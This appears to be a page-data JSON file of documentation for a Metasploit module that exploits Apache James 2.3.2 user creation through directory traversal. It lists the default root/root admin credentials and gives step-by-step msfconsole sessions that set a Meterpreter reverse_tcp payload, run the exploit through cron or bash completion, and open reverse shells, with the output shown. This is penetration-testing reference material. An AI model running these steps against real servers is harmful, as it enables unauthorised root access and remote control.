{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/smtp/apache_james_exec","result":{"data":{"moduleMetadataJson":{"id":"2ee59cc3-4400-5e06-8234-0bf1c60832cb","name":"Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write","fullname":"exploit/linux/smtp/apache_james_exec","description":"This module exploits a vulnerability that exists due to a lack of input\n        validation when creating a user. Messages for a given user are stored\n        in a directory partially defined by the username. By creating a user\n        with a directory traversal payload as the username, commands can be\n        written to a given directory. To use this module with the cron\n        exploitation method, run the exploit using the given payload, host, and\n        port. After running the exploit, the payload will be executed within 60\n        seconds. Due to differences in how cron may run in certain Linux\n        operating systems such as Ubuntu, it may be preferable to set the\n        target to Bash Completion as the cron method may not work. If the target\n        is set to Bash completion, start a listener using the given payload,\n        host, and port before running the exploit. After running the exploit,\n        the payload will be executed when a user logs into the system. For this\n        exploitation method, bash completion must be enabled to gain code\n        execution. This exploitation method will leave an Apache James mail\n        object artifact in the /etc/bash_completion.d directory and the\n        malicious user account.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/linux/smtp/apache_james_exec","documentationSlug":"/modules/documentation/exploit/linux/smtp/apache_james_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This module exploits a vulnerability that exists due to a lack of input validation when creating a user in Apache James 2.3.2.\nBy creating a user with a directory traversal payload as the username, commands can be written to a given directory/file.\nInstructions for installing the vulnerable application for testing can be found here:\n<a href=\"https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf\">https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  <strong>1.</strong> Start msfconsole</p>\n<p>  <strong>2.</strong> DO: Load module exploit/linux/smtp/apache<em>james</em>exec</p>\n<p>  <strong>3.</strong> DO: Set the remote and local options: rhosts, lhosts, lport</p>\n<p>  <strong>4.</strong> DO: Set the preferred payload</p>\n<p>  <strong>5.</strong> DO: Run the check method to determine vulnerability</p>\n<p>  <strong>6.</strong> DO: Run the exploit</p>\n<p>  <strong>7.</strong> The payload will connect to the listener if the exploit is successful</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>USERNAME:</strong>  The administrator username for Apache James 2.3.2 remote administration tool. By default this is 'root'.</p>\n<p>  <strong>PASSWORD:</strong>  The administrator password for Apache James 2.3.2 remote administration tool. By default this is 'root'.</p>\n<p>  <strong>ADMINPORT:</strong>  The port for Apache James 2.3.2 remote administration tool. By default this is '4555'.</p>\n<p>  <strong>RHOSTS:</strong>  The IP address of the vulnerable server.</p>\n<p>  <strong>RPORT:</strong>  The port number of the SMTP service.</p>\n<p>  <strong>POP3PORT</strong> The port for the POP3 Apache James Service.  By default this '110'.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  <strong>If using Cron exploitation method:</strong> This method allows for automatic execution of the payload with no user interaction\nrequired and gives the attacker root privileges. It will also attempt to automatically cleanup the malicious user and the\nmail objects.</p>\n<p>  <strong>1.</strong> Load the module:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 &gt; use exploit/linux/smtp/apache_james_exec</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  <strong>2.</strong> Set remote and local options:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; set target 1\n  target =&gt; 1\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set rhosts  192.168.224.169\n  rhosts =&gt;  192.168.224.169\n\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set lhost 192.168.224.167\n  lhost =&gt; 192.168.224.167\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set lport 4444\n  lport =&gt; 4444</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>3.</strong> Set payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; set payload linux/x64/meterpreter/reverse_tcp\n  payload =&gt; linux/x64/meterpreter/reverse_tcp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>  <strong>4.</strong> Check version and run exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; check\n  [*] 192.168.224.164:25 - The target appears to be vulnerable.\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; exploit\n  \n  [*] Started reverse TCP handler on 192.168.224.167:4444\n  [+] 192.168.224.169:25 - Waiting 60 seconds for cron to execute payload\n  [*] Sending stage (3021284 bytes) to 192.168.224.169\n  [*] Meterpreter session 1 opened (192.168.224.167:4444 -&gt; 192.168.224.169:38694) at 2020-02-02 16:30:02 -0800\n  [*] 192.168.224.169:25 - Command Stager progress - 100.00% done (812/812 bytes)\n\n  meterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<hr>\n<p>  <strong>If using Bash Completion:</strong> This method may be preferable if targeting a linux operating system such as some versions of Ubuntu that\nfails to run the cron method for exploitation. This exploitation method will leave an Apache James mail object artifact in the\n/etc/bash_completion.d directory and the malicious user account.</p>\n<p>  <strong>1.</strong> Load the module:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 &gt; use exploit/linux/smtp/apache_james_exec</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  <strong>2.</strong> Set remote and local options:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; set target 0\n  target =&gt; 0\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set rhosts 192.168.224.164\n  rhosts =&gt; 192.168.224.164\n\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set lhost 192.168.224.167\n  lhost =&gt; 192.168.224.167\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; set lport 4444\n  lport =&gt; 4444</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>3.</strong> Set payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; set payload linux/x64/meterpreter/reverse_tcp\n  payload =&gt; linux/x64/meterpreter/reverse_tcp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>  <strong>4.</strong> Check version and run exploit:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; check\n  [*] 192.168.224.164:25 - The target appears to be vulnerable.\n  msf5 exploit(linux/smtp/apache_james_exec) &gt; exploit\n\n  [*] 192.168.224.164:25 - Command Stager progress - 100.00% done (812/812 bytes)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>5.</strong> Set up and run listener (Can be done before running exploit):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  msf5 exploit(linux/smtp/apache_james_exec) &gt; use exploit/multi/handler\n  msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp\n  payload =&gt; linux/x64/meterpreter/reverse_tcp\n  msf5 exploit(multi/handler) &gt; set lport 4444\n  lport =&gt; 4444\n  msf5 exploit(multi/handler) &gt; set lhost 192.168.224.167\n  lhost =&gt; 192.168.224.167\n\n  msf5 exploit(multi/handler) &gt; run\n\n  [*] Started reverse TCP handler on 192.168.224.167:4444\n  [*] Sending stage (3021284 bytes) to 192.168.224.164\n  [*] Meterpreter session 1 opened (192.168.224.167:4444 -&gt; 192.168.224.164:34752) at 2020-01-18 18:25:14 -0800\n\n  meterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  Id  Name \n  --  ----\n  0   Bash Completion\n  1   Cron</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://www.exploit-db.com/exploits/35513\">https://www.exploit-db.com/exploits/35513</a></li>\n<li><a href=\"https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf\">https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf</a></li>\n</ol>"}}},"pageContext":{"id":"2ee59cc3-4400-5e06-8234-0bf1c60832cb"}}}